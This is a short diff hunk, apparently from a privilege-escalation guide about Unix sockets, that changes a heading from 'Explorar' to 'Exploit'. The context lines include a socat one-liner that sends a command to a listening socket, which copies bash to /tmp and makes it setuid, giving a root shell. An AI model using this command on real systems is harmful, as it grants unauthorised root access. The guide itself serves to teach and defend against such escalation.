@@ -31,7 +31,7 @@ netstat -a -p --unix | grep "socket_test"
 will not be shown, you would have to be root to see it all.)
 unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
 ```
-**Explorar**
+**Exploit**
 ```python
 echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
 ```
